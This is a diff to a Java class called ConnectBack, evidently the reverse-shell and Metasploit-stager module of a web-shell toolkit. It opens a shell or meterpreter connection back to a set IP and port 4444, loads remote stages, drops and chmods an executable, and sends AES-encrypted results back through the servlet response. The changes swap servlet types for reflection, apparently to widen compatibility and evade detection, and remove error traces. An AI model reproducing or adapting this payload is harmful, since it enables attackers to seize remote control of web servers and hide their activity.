@@ -14,6 +14,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.OutputStreamWriter;
 import java.io.PrintStream;
+import java.lang.reflect.Method;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.net.URL;
@@ -32,19 +33,14 @@ import java.util.Stack;
 import java.util.StringTokenizer;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
-import javax.servlet.jsp.PageContext;
 
 public class ConnectBack extends ClassLoader implements Runnable {
    public static String type;
    public static String ip;
    public static String port;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
    InputStream dn;
    OutputStream rm;
    private static final String OS_NAME;
@@ -62,33 +58,61 @@ public class ConnectBack extends ClassLoader implements Runnable {
    }
 
    public boolean equals(Object obj) {
-      PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       HashMap result = new HashMap();
+      boolean var13 = false;
 
-      try {
-         if (type.equals("shell")) {
-            this.shellConnect();
-         } else if (type.equals("meter")) {
-            this.meterConnect();
+      Object so;
+      Method write;
+      label91: {
+         try {
+            var13 = true;
+            this.fillContext(obj);
+            if (type.equals("shell")) {
+               this.shellConnect();
+            } else if (type.equals("meter")) {
+               this.meterConnect();
+            }
+
+            result.put("status", "success");
+            var13 = false;
+            break label91;
+         } catch (Exception var17) {
+            result.put("status", "fail");
+            result.put("msg", var17.getMessage());
+            var13 = false;
+         } finally {
+            if (var13) {
+               try {
+                  so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+                  write = so.getClass().getDeclaredMethod("write", byte[].class);
+                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+                  so.getClass().getDeclaredMethod("flush").invoke(so);
+                  so.getClass().getDeclaredMethod("close").invoke(so);
+               } catch (Exception var14) {
+               }
+
+            }
          }
 
-         result.put("status", "success");
-      } catch (Exception var6) {
-         result.put("status", "fail");
-         result.put("msg", var6.getMessage());
+         try {
+            so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+            write = so.getClass().getDeclaredMethod("write", byte[].class);
+            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+            so.getClass().getDeclaredMethod("flush").invoke(so);
+            so.getClass().getDeclaredMethod("close").invoke(so);
+         } catch (Exception var15) {
+         }
+
+         return true;
       }
 
       try {
-         ServletOutputStream so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
-         var5.printStackTrace();
+         so = this.Response.getClass().getDeclaredMethod("getOutputStream").invoke(this.Response);
+         write = so.getClass().getDeclaredMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
+         so.getClass().getDeclaredMethod("flush").invoke(so);
+         so.getClass().getDeclaredMethod("close").invoke(so);
+      } catch (Exception var16) {
       }
 
       return true;
@@ -149,7 +173,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
          port = "4444";
          c.meterConnect();
       } catch (Exception var2) {
-         var2.printStackTrace();
       }
 
    }
@@ -217,7 +240,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
                   Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
                }
             } catch (Exception var17) {
-               var17.printStackTrace();
             }
          }
 
@@ -263,7 +285,7 @@ public class ConnectBack extends ClassLoader implements Runnable {
 
          String aesPassword = props.getProperty("AESPassword", (String)null);
          if (aesPassword != null) {
-            Object[] streams = (Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword);
+            Object[] streams = (Object[])((Object[])Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object)null, in, out, aesPassword));
             in = (InputStream)streams[0];
             out = (OutputStream)streams[1];
          }
@@ -316,7 +338,6 @@ public class ConnectBack extends ClassLoader implements Runnable {
          Object stage = clazz.newInstance();
          clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
       } catch (Throwable var11) {
-         var11.printStackTrace();
          var11.printStackTrace(new PrintStream(out));
       }
 
@@ -460,13 +481,28 @@ public class ConnectBack extends ClassLoader implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getDeclaredMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
       return encrypted;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getDeclaredMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getDeclaredMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getDeclaredMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getDeclaredMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    static {
